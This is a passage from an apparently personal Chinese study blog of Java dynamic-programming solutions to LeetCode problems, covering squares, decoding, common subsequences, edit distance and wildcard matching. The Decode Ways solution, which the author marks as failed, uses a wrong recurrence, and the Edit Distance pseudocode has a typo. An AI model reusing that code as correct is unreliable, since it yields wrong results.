class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numSquares</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    List&lt;Integer&gt; squareList = list(n);</span><br><span class="line">    <span class="keyword">int</span>[] dp = <span class="keyword">new</span> <span class="keyword">int</span>[n + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        dp[i] = Integer.MAX_VALUE;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> square : squareList) &#123;</span><br><span class="line">            <span class="keyword">if</span> (square &gt; i) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            dp[i] = Math.min(dp[i], dp[i - square] + <span class="number">1</span>);</span><br><span class="line">        &#125;       </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[n];</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ArrayList&lt;Integer&gt; <span class="title">list</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">         ArrayList&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList();</span><br><span class="line">         <span class="keyword">int</span> i=<span class="number">1</span>,num=<span class="number">1</span>;</span><br><span class="line">         <span class="keyword">while</span>(i&lt;=n)&#123;</span><br><span class="line">            res.add(num);</span><br><span class="line">             i++;</span><br><span class="line">             num=i*i;</span><br><span class="line">         &#125;</span><br><span class="line">        <span class="keyword">return</span> res;        </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="91-decode-ways">91. Decode Ways ×</span></h2><p>A message containing letters from <code>A-Z</code> is being encoded to numbers using the following mapping:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#39;A&#39; -&gt; 1</span><br><span class="line">&#39;B&#39; -&gt; 2</span><br><span class="line">...</span><br><span class="line">&#39;Z&#39; -&gt; 26</span><br></pre></td></tr></table></figure><p>Given a <strong>non-empty</strong> string containing only digits, determine the total number of ways to decode it.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;12&quot;</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: It could be decoded as &quot;AB&quot; (1 2) or &quot;L&quot; (12).</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;226&quot;</span><br><span class="line">Output: 3</span><br><span class="line">Explanation: It could be decoded as &quot;BZ&quot; (2 26), &quot;VF&quot; (22 6), or &quot;BBF&quot; (2 2 6).</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numDecodings</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (s == <span class="keyword">null</span> || s.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;       </span><br><span class="line">        <span class="keyword">int</span> n = s.length();</span><br><span class="line">        <span class="keyword">int</span>[] dp = <span class="keyword">new</span> <span class="keyword">int</span>[n + <span class="number">1</span>];</span><br><span class="line">        dp[<span class="number">1</span>] = s.charAt(<span class="number">0</span>) == <span class="string">'0'</span> ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line">        dp[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> one = Integer.valueOf(s.substring(i-<span class="number">1</span>,i));</span><br><span class="line">            <span class="keyword">if</span>(one!=<span class="number">0</span>)&#123;</span><br><span class="line">                dp[i]+=dp[i-<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">int</span> two=Integer.valueOf(s.substring(i-<span class="number">2</span>,i));</span><br><span class="line">            <span class="keyword">if</span> (two &lt;= <span class="number">26</span>&amp;&amp;two&gt;<span class="number">0</span>) &#123;</span><br><span class="line">                dp[i] = dp[i - <span class="number">2</span>]+<span class="number">1</span>;</span><br><span class="line">            &#125; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1><span id="双序列类动态规划字符匹配类">双序列类动态规划：字符匹配类</span></h1><p>它的题目特征其实特别明显，比如：</p><p>·  输入是两个字符串，问是否通过一定的规则相匹配</p><p>·  输入是两个字符串，问两个字符串是否存在包含被包含的关系</p><p>·  输入是两个字符串，问一个字符串怎样通过一定规则转换成另一个字符串</p><p>·  输入是两个字符串，问它们的共有部分</p><p>可以画表格来解题</p><h2><span id="1143-longest-common-subsequence-">1143. Longest Common Subsequence -</span></h2><p>给定两个字符串 <code>text1</code> 和 <code>text2</code>，返回这两个字符串的最长公共子序列。</p><p>一个字符串的 <em>子序列</em> 是指这样一个新的字符串：它是由原字符串在不改变字符的相对顺序的情况下删除某些字符（也可以不删除任何字符）后组成的新字符串。<br> 例如，”ace” 是 “abcde” 的子序列，但 “aec” 不是 “abcde” 的子序列。两个字符串的「公共子序列」是这两个字符串所共同拥有的子序列。</p><p>若这两个字符串没有公共子序列，则返回 0。</p><p><strong>示例</strong> <strong>1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：text1 &#x3D; &quot;abcde&quot;, text2 &#x3D; &quot;ace&quot; </span><br><span class="line">输出：3  </span><br><span class="line">解释：最长公共子序列是 &quot;ace&quot;，它的长度为 3。</span><br></pre></td></tr></table></figure><p><strong>示例</strong> <strong>2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：text1 &#x3D; &quot;abc&quot;, text2 &#x3D; &quot;abc&quot;</span><br><span class="line">输出：3</span><br><span class="line">解释：最长公共子序列是 &quot;abc&quot;，它的长度为 3。</span><br></pre></td></tr></table></figure><p><strong>示例</strong> <strong>3:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：text1 &#x3D; &quot;abc&quot;, text2 &#x3D; &quot;def&quot;</span><br><span class="line">输出：0</span><br><span class="line">解释：两个字符串没有公共子序列，返回 0。</span><br></pre></td></tr></table></figure><p>  画图可得</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">   &quot;&quot;  a  c  e</span><br><span class="line">&quot;&quot;  0  0  0  0</span><br><span class="line">a   0             如果其中一个字符串是空串</span><br><span class="line">b   0             那么两个字符不存在公共子序列</span><br><span class="line">c   0             对应的子问题状态初始化为 0</span><br><span class="line">d   0</span><br><span class="line">e   0</span><br><span class="line">   &quot;&quot;  a  c  e</span><br><span class="line">&quot;&quot;  0  0  0  0</span><br><span class="line">a   0  1  1  1    text1 &#x3D; &quot;a&quot;  text2 &#x3D; &quot;a&quot; || text2 &#x3D; &quot;ac&quot; || text2 &#x3D; &quot;ace&quot;</span><br><span class="line">b   0             考虑当前状态 dp[i][j] 的时候        </span><br><span class="line">c   0             我们可以考虑子状态 dp[i - 1][j - 1]</span><br><span class="line">d   0                             dp[i][j - 1]</span><br><span class="line">e   0                             dp[i - 1][j]</span><br><span class="line">   &quot;&quot;  a  c  e</span><br><span class="line">&quot;&quot;  0  0  0  0</span><br><span class="line">a   0  1  1  1    </span><br><span class="line">b   0  1  1  1    text1 &#x3D; &quot;ab&quot;  text2 &#x3D; &quot;a&quot; || text2 &#x3D; &quot;ac&quot; || text2 &#x3D; &quot;ace&quot;</span><br><span class="line">c   0</span><br><span class="line">d   0</span><br><span class="line">e   0</span><br><span class="line">   &quot;&quot;  a  c  e</span><br><span class="line">&quot;&quot;  0  0  0  0</span><br><span class="line">a   0  1  1  1    </span><br><span class="line">b   0  1  1  1</span><br><span class="line">c   0  1  2  2    text1 &#x3D; &quot;abc&quot;  text2 &#x3D; &quot;a&quot; || text2 &#x3D; &quot;ac&quot; || text2 &#x3D; &quot;ace&quot;</span><br><span class="line">d   0             画到这里，不知道你有没有发现当当前的字符不相同时</span><br><span class="line">e   0                 dp[i][j] &#x3D; Math.max(dp[i - 1][j], dp[i][j - 1])</span><br><span class="line">  &quot;&quot;  a  c  e</span><br><span class="line">&quot;&quot;  0  0  0  0</span><br><span class="line">a   0  1  1  1    </span><br><span class="line">b   0  1  1  1</span><br><span class="line">c   0  1  2  2</span><br><span class="line">d   0  1  2  2    text1 &#x3D; &quot;abcd&quot;  text2 &#x3D; &quot;a&quot; || text2 &#x3D; &quot;ac&quot; || text2 &#x3D; &quot;ace&quot;</span><br><span class="line">e   0</span><br><span class="line">   &quot;&quot;  a  c  e</span><br><span class="line">&quot;&quot;  0  0  0  0</span><br><span class="line">a   0  1  1  1    </span><br><span class="line">b   0  1  1  1</span><br><span class="line">c   0  1  2  2</span><br><span class="line">d   0  1  2  2    </span><br><span class="line">e   0  1  2  3    text1 &#x3D; &quot;abcde&quot;  text2 &#x3D; &quot;a&quot; || text2 &#x3D; &quot;ac&quot; || text2 &#x3D; &quot;ace&quot;</span><br><span class="line"></span><br><span class="line">3 就是我们要返回的答案</span><br></pre></td></tr></table></figure><p>在拆解问题中也说了，有两种情况，就是:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">如果 str1(i) !&#x3D; str2(j):</span><br><span class="line">dp[i][j] &#x3D; Math.max(dp[i - 1][j], dp[i][j - 1])</span><br><span class="line"></span><br><span class="line">如果 str1(i) &#x3D;&#x3D; str2(j):</span><br><span class="line">dp[i][j] &#x3D; Math.max(dp[i - 1][j], dp[i][j - 1], dp[i - 1][j - 1] + 1)</span><br><span class="line"></span><br><span class="line">因为 dp[i - 1][j - 1] + 1 &gt;&#x3D; dp[i - 1][j] &amp;&amp; dp[i - 1][j - 1] + 1 &gt;&#x3D; dp[i][j - 1]</span><br><span class="line">所以第二项可以化简：</span><br><span class="line"></span><br><span class="line">如果 str1(i) &#x3D;&#x3D; str2(j):</span><br><span class="line">dp[i][j] &#x3D; dp[i - 1][j - 1] + 1</span><br></pre></td></tr></table></figure><p>讲道理，第二次做的时候不明白为什么和dp[i - 1][j - 1]有关。</p><p>其实是这样，比如说我们比abc和acc，要么最长的长度是ab和ac基础上+1，要么是abc和ac，要么是acc和ab。因为acc和abc以及ac和abc的匹配长度是一样的。所以abc和acc不能是ac基础上+1。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">longestCommonSubsequence</span><span class="params">(String text1, String text2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> length1 = text1.length();</span><br><span class="line">    <span class="keyword">int</span> length2 = text2.length();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span>[][] dp = <span class="keyword">new</span> <span class="keyword">int</span>[length1 + <span class="number">1</span>][length2 + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>[] textArr1 = text1.toCharArray();</span><br><span class="line">    <span class="keyword">char</span>[] textArr2 = text2.toCharArray();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= length1; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= length2; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (textArr1[i - <span class="number">1</span>] == textArr2[j - <span class="number">1</span>]) &#123;</span><br><span class="line">                dp[i][j] = dp[i - <span class="number">1</span>][j - <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                dp[i][j] = Math.max(dp[i - <span class="number">1</span>][j], dp[i][j - <span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dp[length1][length2];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>优化后：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">longestCommonSubsequence</span><span class="params">(String s1, String s2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> m = s1.length(), n = s2.length();</span><br><span class="line">    <span class="keyword">if</span> (m &lt; n)  <span class="keyword">return</span> longestCommonSubsequence(s2, s1);</span><br><span class="line">    <span class="keyword">int</span>[][] dp = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">2</span>][n + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>, k = <span class="number">1</span>; i &lt; m; ++i, k ^= <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; ++j)</span><br><span class="line">            <span class="keyword">if</span> (s1.charAt(i) == s2.charAt(j)) dp[k][j + <span class="number">1</span>] = <span class="number">1</span> + dp[k ^ <span class="number">1</span>][j];</span><br><span class="line">            <span class="keyword">else</span> dp[k][j + <span class="number">1</span>] = Math.max(dp[k ^ <span class="number">1</span>][j + <span class="number">1</span>], dp[k][j]);</span><br><span class="line">    <span class="keyword">return</span> dp[m % <span class="number">2</span>][n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font color="red">^是亦或</font></p><h2><span id="72-edit-distance">72. Edit Distance √</span></h2><p>给定两个单词 <em>word1</em> 和 <em>word2*，计算出将 *word1</em> 转换成 <em>word2</em> 所使用的最少操作数 。</p><p>你可以对一个单词进行如下三种操作：</p><p>·  插入一个字符</p><p>·  删除一个字符</p><p>·  替换一个字符</p><p><strong>示例</strong> <strong>1:</strong></p><p>输入: word1 = “horse”, word2 = “ros”<br> 输出: 3<br> 解释:<br> horse -&gt; rorse (将 ‘h’ 替换为 ‘r’)<br> rorse -&gt; rose (删除 ‘r’)<br> rose -&gt; ros (删除 ‘e’)</p><p><strong>示例</strong> <strong>2:</strong></p><p>输入: word1 = “intention”, word2 = “execution”<br> 输出: 5<br> 解释:<br> intention -&gt; inention (删除 ‘t’)<br> inention -&gt; enention (将 ‘i’ 替换为 ‘e’)<br> enention -&gt; exention (将 ‘n’ 替换为 ‘x’)<br> exention -&gt; exection (将 ‘n’ 替换为 ‘c’)<br> exection -&gt; execution (插入 ‘u’)</p><p>求什么就设什么</p><p>Dp[i][j]设为word1 的前i个字符和word2的前j个字符转换为相同字符串的最小费用</p><p>初始化条件矩阵（x轴设为i，y轴为j）</p><p>因为null-&gt;null h o r s e分别是0 1 2 3 4 5</p><p>且null-&gt;null r o s 分别是 0 1 2 3</p><p><img src="clip_image001-1585225322024.png" alt></p><p><strong>H和R</strong></p><p><img src="clip_image002.png" alt></p><p>此时黄色格子的值相当于是把h替换r是最小的</p><p>Min(dp[i-1][j],dp[i][j-1],dp[i-1][j-1])+1</p><p>因此dp[i-1][j-1]+1代表替换操作</p><p><strong>HO</strong>和R-&gt;依赖以上一步的变化结果<strong>-&gt;RO</strong>和R</p><p><img src="clip_image003.png" alt></p><p>此时可以是将o删除 dp[i-1][j]+1(i-1就是删除i)或者是将o替换成null</p><p><img src="clip_image004.png" alt></p><p>此时可以将o插入dp[i][j-1]+1(插入也相当于删除第j个元素)</p><p>因此我们可以得到</p><p>If(word1[i]==word1[j])</p><p>​    Dp[i][j]=dp[i-1][j-1]</p><p>Else</p><p>​    Dp[i][j]=Min(dp[i-1][j],dp[i][j-1],dp[i-1][j-1])+1;</p><table><thead><tr><th><strong>0</strong></th><th><strong>1</strong></th><th><strong>2</strong></th><th><strong>3</strong></th><th><strong>4</strong></th><th><strong>5</strong></th></tr></thead><tbody><tr><td><strong>1</strong></td><td>1</td><td>2</td><td>2</td><td>3</td><td>4</td></tr><tr><td><strong>2</strong></td><td>2</td><td>1</td><td>2</td><td>3</td><td>4</td></tr><tr><td><strong>3</strong></td><td>3</td><td>2</td><td>2</td><td>2</td><td>3</td></tr></tbody></table><p>每次pre一开始肯定是dp[0],然后是dp[1]…dp[m],循环了一遍后</p><p>又是从dp[0]开始。因为循环没有改变dp[0]的值，因此需要改变。（在二维里面可以初始化dp[i][0]），在一维的里面必须手动初始化。</p><p>其实从另外一个角度去想问题，题目和你说了增删改都行。因此你可以不用题目的例子自己想例子，然后去推出里面的关系比如说ac和acd就可以推出增删（还有相等）的情况，然后ad和ac就可以推出改的情况。题目例子往往没那么好一眼看出其中的关系。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minDistance</span><span class="params">(String word1, String word2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>[] w1=word1.toCharArray();</span><br><span class="line">    <span class="keyword">char</span>[] w2=word2.toCharArray();</span><br><span class="line">    <span class="keyword">int</span> n=w1.length,m=w2.length;</span><br><span class="line">    <span class="keyword">int</span>[][] dp = <span class="keyword">new</span> <span class="keyword">int</span>[n+<span class="number">1</span>][m+<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= n; i++)   dp[i][<span class="number">0</span>]=i;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= m; i++)   dp[<span class="number">0</span>][i]=i;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;=n ; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;=m ; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(w1[i-<span class="number">1</span>]==w2[j-<span class="number">1</span>])&#123;</span><br><span class="line">                dp[i][j]=dp[i-<span class="number">1</span>][j-<span class="number">1</span>];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                dp[i][j]=Math.min(Math.min(dp[i-<span class="number">1</span>][j],dp[i][j-<span class="number">1</span>]),dp[i-<span class="number">1</span>][j-<span class="number">1</span>])+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[n][m];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>降维打击</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minDistance</span><span class="params">(String word1, String word2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>[] w1=word1.toCharArray();</span><br><span class="line">    <span class="keyword">char</span>[] w2=word2.toCharArray();</span><br><span class="line">    <span class="keyword">int</span> n=w1.length,m=w2.length;</span><br><span class="line">    <span class="keyword">int</span>[] dp = <span class="keyword">new</span> <span class="keyword">int</span>[m+<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++)   dp[i]=i;</span><br><span class="line">    <span class="keyword">int</span> tmp=<span class="number">0</span>,pre=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;=n ; i++) &#123;</span><br><span class="line">        pre = dp[<span class="number">0</span>];</span><br><span class="line">        dp[<span class="number">0</span>] = i;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;=m ; j++) &#123;</span><br><span class="line">            tmp=dp[j];</span><br><span class="line">            <span class="keyword">if</span>(w1[i-<span class="number">1</span>]==w2[j-<span class="number">1</span>])&#123;</span><br><span class="line">                dp[j]=pre;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                dp[j]=Math.min(Math.min(dp[j],dp[j-<span class="number">1</span>]),pre)+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            pre=tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[m];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="44-wildcard-matching-">44. Wildcard Matching -</span></h2><p>给定一个字符串 (s) 和一个字符模式 (p) ，实现一个支持 ‘?’ 和 ‘*’ 的通配符匹配。</p><p>‘?’ 可以匹配任何单个字符。<br> ‘*’ 可以匹配任意字符串（包括空字符串）。</p><p>两个字符串<strong>完全匹配</strong>才算匹配成功。</p><p><strong>说明</strong>:</p><p>·  s 可能为空，且只包含从 a-z 的小写字母。</p><p>·  p 可能为空，且只包含从 a-z 的小写字母，以及字符 ? 和 *。</p><p><strong>示例</strong> <strong>1:</strong></p><p>输入:<br> s = “aa”<br> p = “a”<br> 输出: false<br> 解释: “a” 无法匹配 “aa” 整个字符串。</p><p><strong>示例</strong> <strong>2:</strong></p><p>输入:<br> s = “aa”<br> p = “*”<br> 输出: true<br> 解释: ‘*’ 可以匹配任意字符串。</p><p><strong>示例</strong> <strong>3:</strong></p><p>输入:<br> s = “cb”<br> p = “?a”<br> 输出: false<br> 解释: ‘?’ 可以匹配 ‘c’, 但第二个 ‘a’ 无法匹配 ‘b’。</p><p><strong>示例</strong> <strong>4:</strong></p><p>输入:<br> s = “adceb”<br> p = “<em>a</em>b”<br> 输出: true<br> 解释: 第一个 ‘<em>‘ 可以匹配空字符串, 第二个 ‘</em>‘ 可以匹配字符串 “dce”.</p><p><strong>示例</strong> <strong>5:</strong></p><p>输入:<br> s = “acdcb”<br> p = “a*c?b”<br> 输入: false</p><p><img src="clip_image001-1585225470642.png" alt></p><p>题目给定两个字符串，一个字符串是匹配串，除了小写字母外，匹配串里面还包含 * 和 ? 这两个特殊字符，另一个是普通字符串，里面只包含小写字母。</p><p>题目问这个普通字符串是否和匹配字符串相匹配，匹配规则是 ? 可以匹配单个字符，* 可以匹配一个区间，也就是多个字符，当然也可以匹配 0 个字符，也就是空串。</p><p>依然是四个步骤走一遍：</p><p>·  问题拆解</p><p>做多了，你发现这种问题其实都是一个套路，老样子，我们还是根据我们要求解的问题去看和其直接相关的子问题，我们需要求解的问题是 pattern(0…m) 和 str(0…n) 是否匹配，<strong>这里的核心依然是字符之间的比较，但是和之前不同的是，这个比较不仅仅是看两个字符相不相等，它还有了一定的匹配规则在里面</strong>，那我们就依次枚举讨论下：</p><p>pattern(m) == str(n):<br> 问题拆解成看子问题 pattern(0…m-1) 和 str(0…n-1) 是否匹配</p><p>pattern(m) == ?:<br> 问题拆解成看子问题 pattern(0…m-1) 和 str(0…n-1) 是否匹配</p><p><font color="blue">pattern(m) == *:可以匹配空串、以及任意多个字符</font></p><p>当 * 匹配空串时：问题拆解成看子问题 pattern(0…m-1) 和 str(0…n) 是否匹配</p><p>当 * 匹配任意字符时：问题拆解成看子问题 pattern(0…m) 和 str(0…n-1) 是否匹配</p><p>这里解释一下，<em>匹配任意多个字符意味着之前的子问题也可以使用当前的</em>，也就是用 pattern(m) 来进行匹配，因此，当前问题可以拆解成子问题 pattern(0…m) 和 str(0…n-1) 是否匹配，你发现弄来弄去，子问题依然是那三个：</p><p>·  pattern(0…m-1) 和 str(0…n-1) 是否匹配</p><p>·  pattern(0…m-1) 和 str(0…n) 是否匹配</p><p>·  pattern(0…m) 和 str(0…n-1) 是否匹配</p><p>不知道你是否发现了字符匹配类动态规划问题的共性，如果是画表格，你只需要关注当前格子的<font color="orange"> <strong>左边、上边、左上</strong></font> 这三个位置的相邻元素，因为表格有实际数据做辅助，所以画表格有时可以帮助你找到问题与子问题之间的联系。</p><p>·  状态定义</p><p>还是老样子，dp[i][j] 表示的就是问题 pattern(0…i) 和 str(0…j) 的答案，直接说就是 pattern(0…i) 和 str(0…j) 是否匹配</p><p>·  递推方程</p><p>把之前 “问题拆解” 中的文字描述转换成状态的表达式就是递推方程：</p><p>pattern(i) == str(j) || pattern(i) == ‘?’:<br> dp[i][j] = dp[i - 1][j - 1]</p><p> pattern(i) == ‘*’:<br> dp[i][j] = dp[i - 1][j] || dp[i][j - 1]</p><p>·  实现</p><p>这类问题的状态数组往往需要多开一格，主要是为了考虑空串的情况，这里我就不赘述了。</p><p>我想说的是，关于初始化的部分，如果 str 是空的，pattern 最前面有 *，因为 * 是可以匹配空串的，因此这个也需要记录一下，反过来，如果 pattern 是空的，str 只要不是空的就无法匹配，这里就不需要特别记录。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isMatch</span><span class="params">(String s, String p)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>[] sArr = s.toCharArray();</span><br><span class="line">    <span class="keyword">char</span>[] pArr = p.toCharArray();</span><br><span class="line">   <span class="keyword">int</span> n=pArr.length,m=sArr.length;</span><br><span class="line">    <span class="keyword">boolean</span>[][] dp = <span class="keyword">new</span> <span class="keyword">boolean</span>[n + <span class="number">1</span>][m + <span class="number">1</span>];</span><br><span class="line">    dp[<span 